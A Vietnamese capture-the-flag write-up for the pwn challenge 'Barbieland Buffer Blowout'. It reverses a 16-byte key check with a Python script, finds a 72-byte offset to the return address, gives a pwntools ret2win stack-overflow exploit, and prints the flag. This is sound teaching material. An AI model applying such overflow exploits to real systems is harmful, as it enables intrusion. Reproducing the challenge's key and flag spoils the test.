Giải đấu: Riffhack

Tên bài: Barbieland Buffer Blowout

Mảng: Pwn

Mô tả: A glamorous Barbieland relay kiosk still accepts calibration input before unlocking its backstage tools. Work the console correctly and recover the final pink protocol message.

Dạng flag: bitctf{...}

### 📂 Tài nguyên bài tập
Bạn có thể tải các file tại đây để thực hành:
* [File gốc (barbie_core.64)](./barbie_core.64)
* [File được decode (barbie_core)](./barbie_core)
* [Script khai thác (script_Barbieland_Buffer_Blowout.py)](./script_Barbieland_Buffer_Blowout.py)
* [Script khai thác (script_tính_key_target.py)](./script_tính_key_target.py)

Địa chỉ server: _`` nc 162.243.44.232 5000 ``_

__1. PHÂN TÍCH FILE__ 

Khi mình dùng lệnh _``file [ten_file]``_ ở trong Ubuntu thì nó sẽ hiện như bức ảnh ở dưới

<img width="907" height="56" alt="image" src="https://github.com/user-attachments/assets/b2a8b176-0504-4c13-a5ae-7352c4ccecb0" />

__-> Lí do là bởi vì file này bị mã hóa dưới định dạng Base64 (.b64). Vì thế chúng ta cần phải decode nó thành file nhị phân thông qua lệnh __``base64 -d barbie_core.b64 > barbie_core``____

Sau khi đã decode thành file nhị phân thì cần phải kiểm tra những cơ chế bảo mật của file này bằng lệnh _``checksec [ten_file]``_ 

<img width="785" height="241" alt="image" src="https://github.com/user-attachments/assets/f524308f-cb7e-4f9f-936a-6293fe4d2b65" />

__-> Có thể thấy được File này là kiến trúc 64-bit và chỉ bật duy nhất lớp bảo vệ NX. Do đó, chúng ta không thể nhồi trực tiếp shellcode lên stack để chạy được, mà khả năng cao sẽ phải dùng kỹ thuật ROP (Return-Oriented Programming) hoặc ret2libc hoặc ret2win__

__2. PHÂN TÍCH MÃ NGUỒN__

Trước hết cần phải bỏ file vào Ghidra để phân tích

__``HÀM MAIN``__

<img width="827" height="516" alt="image" src="https://github.com/user-attachments/assets/12131a45-b467-418e-97c9-6e9ac58ca970" />

<img width="680" height="73" alt="image" src="https://github.com/user-attachments/assets/853dee9e-2f9f-4f2c-a036-4d7716f6d252" />

Ở đây có thể thấy được rằng nếu như chúng ta chạy file _``barbie_core``_ bằng lệnh _``run``_ trong GDB Ubuntu thì nó sẽ đợi lệnh nhập với chú thích là: __``Enter 16-byte glam calibration code:``__

<img width="493" height="126" alt="image" src="https://github.com/user-attachments/assets/5c3a61a3-46c2-4328-94cd-8533a26a7188" />

Đây là phần đọc dữ liệu đầu vào với:

* Chương trình đọc tối đa 0x40 (64byte) từ bàn phím lưu vào __``mảng local_48``__

* Nếu như chương trình xảy ra lỗi về vấn đề đọc dữ liệu thì sẽ trả về __``Input error``__ và kết thúc hàm với mã lỗi là __``1``__

<img width="780" height="312" alt="image" src="https://github.com/user-attachments/assets/0dbd83e7-6af1-4056-bf29-60fcff6c22eb" />

Tiếp đến là sẽ rẽ nhánh theo những kí tự mà mình đã nhập vào:

1. Chương trình sẽ thay thế kí tự xuống dòng __``\n``__ thành kí tự kết thúc chuỗi __``\0``__ để mà chuẩn hóa dữ liệu và sau đó chuỗi đã chuẩn hóa sẽ được truyền vào hàm __``check_token
(local_48)``__

2. Nếu như __``iVar1 == 0``__ (1 biến kiểm tra gì đó ở trong hàm __``check_token()``__) thì chương trình sẽ in ra thông báo __``Glam sync failed. Session terminated.``__

3. Còn nếu như __``iVar != 0``__  chương trình sẽ cho phép gọi và truy cập vào hàm __``vulnerable_prompt()``__ để mà thực thi

4. Sau đó sẽ in ra dòng chữ __``Relay closing.``__ và kết thúc thành công với mã là __``0``__

__``HÀM CHECK_TOKEN()``__

<img width="728" height="611" alt="image" src="https://github.com/user-attachments/assets/6c6ca78b-0d32-432a-9d02-ee86e1955b02" />

__``sVar3 = strlen(param_1); if (sVar3 == 0x10)``__ chương trình sẽ lấy độ dài của chuỗi đầu vào khi nhập ở hàm main -> kiểm tra nếu như không đủ 16 kí tự thì sẽ chuyển hướng qua nhánh else -> trả về uVar4 = 0 (thất bại)

Nếu như đã đủ 16 kí tự thì sẽ chạy vòng lặp và duyện qua các kí tự __``for (local_20 = 0; local_20 < 0x10; local_20 = local_20 + 1)``__

Tại mỗi vòng lặp, chương trình sẽ thực hiện các biến đổi phức tạp như:

* Xoay bit: Tính toán giá trị __``cVar1 = rol8(local_19, local_20 % 5)``__ bằng cách xoay bit biến trạng thái sang trái

* Biến đổi giá trị đầu vào: Tính toán công thức __``((local_20 << 3) - local_20) + 0x5aU ^ bVar2``__ rồi cộng dồn với __``cVar1``__ để tạo ra byte kiểm tra mới

* Đối chiếu: So sánh byte vừa biến đổi __``bVar2``__ với phần tử tương ứng trong mảng bí mật __``target.0[local_20]``__. Nếu sai lệch, hàm lập tức dừng lại và __``return 0``__

* Cập nhật trạng thái: Cập nhật lại biến __``local_19 = bVar2 ^ local_19 * '!'``__ để dùng cho việc tính toán ký tự tiếp theo trong chuỗi

__-> Trả về __``1``__ khi 16 kí tự đều khớp với mảng __``target.0``__, trả về __``0``__ khi có ít nhất 1 trong 16 kí tự không khớp với mảng __``target.0``__

__``HÀM VULNERABLE_PROMPT()``__

<img width="442" height="295" alt="image" src="https://github.com/user-attachments/assets/eaa09b12-52ac-495f-b6c7-64bea360fec7" />

Sau khi hàm __``check_token()``__ kiểm tra các kí tự trùng khớp với __``target.0``__  -> trả về giá trị là 1 -> chương trình sẽ chạy hàm __``vulnerable_prompt()``__

__Lỗi "Chết Người"__

Như bức ảnh trên, chương trình sẽ khai báo mảng với kích thước là 64 bytes -> chương trình sẽ in ra các yêu cầu tải lên gói dữ liệu profile

<img width="492" height="75" alt="image" src="https://github.com/user-attachments/assets/e6176564-2d4d-41f2-b094-29a5f149130f" />

Lỗ hổng __``"Chết Người"``__ nằm ở đây __``read(0,local_48,0x100);``__

__-> Với việc chương trình cung cấp cho mảng _``local_48``_ với kích thước là 64 bytes thế nhưng hàm _``read``_ lại đọc và ghi vào bộ đệm với kích thước là __``0x100 tương ứng với 256 bytes``__ -> chương trình sẽ bị tràn bộ đệm -> ghi đè lên các vùng nhớ quan trọng -> lỗ hổng __``Buffer Overflow``__ kinh điển -> Đưa địa chỉ của hàm win vào __``Return Address``__ để có thể lấy flag 

<img width="762" height="418" alt="image" src="https://github.com/user-attachments/assets/f56241c8-51d8-48c5-988a-d846239971b3" />

__KẾ HOẠCH TẤN CÔNG__

__- Trước hết chúng ta cần phải tìm 16 kí tự kí tự của hàm __``target.0``__ -> Phải trùng khớp với __``target.0``__ mới có thể vượt qua được hàm __``check_token()``____

__- Sau khi mà tìm được 16 kí tự của hàm __``target.0``__ việc của chúng ta bây giờ chỉ cần tính offset từ chỗ chương trình kêu ta nhập input ở hàm __``vulnerable_prompt()``__ tới chỗ __``Return Address``__ để có thể tính theo công thức __``payload + địa chỉ hàm win()``__ -> Lấy flag__


__3. THỰC HIỆN KẾ HOẠCH__

Khi nhấp đúp vào hàm __``target.0[local_20]``__ thì nó sẽ được như hình dưới

<img width="911" height="521" alt="image" src="https://github.com/user-attachments/assets/ead606dc-3cbc-43ad-bb0c-76255d20eea0" />

Ohhh! Chuỗi 16 kí tự của hàm __``target.0[local_20]``__ hiện ngay trước mắt luôn -> Bây giờ ta chỉ cần lập công thức ngược 

```python
def rol8(val, r):
    """Hàm mô phỏng phép xoay bit trái (Rotate Left) 8-bit"""
    return ((val << r) | (val >> (8 - r))) & 0xFF

target = [
    0x5A, 0x06, 0xB5, 0x86, 0x17, 0x08, 0x8E, 0xBA, 
    0xD6, 0xD4, 0xD7, 0x06, 0xB7, 0x96, 0x38, 0xAE
]

key = ""
local_19 = 0x42  # Trạng thái khởi tạo ban đầu trong code C

for i in range(16):
    target_val = target[i]
    cVar1 = rol8(local_19, i % 5)
    val_calc = (((i << 3) - i) + 0x5A) & 0xFF
    bVar2 = (target_val - cVar1) & 0xFF
    original_char = bVar2 ^ val_calc
    key += chr(original_char)
    local_19 = target_val ^ (local_19 * ord('!')) & 0xFF
    
print("Key cần tìm là:", key)
```
__-> Key cần tìm là: ``B4RB13-C0R3GL4M!``__

Khi đã có key việc của chúng ta bây giờ chỉ cần đi tìm địa chỉ của hàm __``win()``__ bằng 2 cách:

Cách 1: Nhấp đúp vào hàm __``win()``__ trong Ghidra và lấy địa chỉ ở bên phần ASM

Cách 2: Phân tích file trong GDB của Ubuntu với câu lệnh _``p [ten_ham]``_ như hình bên dưới

<img width="883" height="53" alt="image" src="https://github.com/user-attachments/assets/fd70e940-8135-4a3a-8704-3c0ce7243dbf" />

Khi đã có địa chỉ hàm __``win()``__ việc của chúng ta bây giờ tìm offset từ chỗ input của hàm __``vulnerable_prompt()``__ đến __``Retuen Adress``__ để hoàn thiện payload

<img width="1465" height="81" alt="image" src="https://github.com/user-attachments/assets/768f2365-2495-4c44-a555-742c3c52c378" />

<img width="828" height="81" alt="image" src="https://github.com/user-attachments/assets/9b55a5fc-e7e7-4ae5-b2ff-e059c77eb1b5" />

Ở đây mình dùng lệnh _``cyclic 300``_ để nhập vào _``pilot>``_ và tính được _``offset = 72``_ -> Có đoạn script như bên dưới 

Vì đầu vào của chương trình là 16 kí tự byte thế nên chúng ta cần phải đổi cái key text -> byte để có thể thỏa mãn được điều kiện __``key = b"B4RB13-C0R3GL4M!"``__

```python

from pwn import *

p = remote('host', port)
key = b"B4RB13-C0R3GL4M!"
offset = 72

target_address = 0x4013c3  
payload = b"A" * offset + p64(target_address)
p.sendlineafter(b"code> ", key) 
p.sendlineafter(b"pilot> ", payload)
p.interactive()

bitctf{{b4rb13_buff3r_b10w0u7}}
```
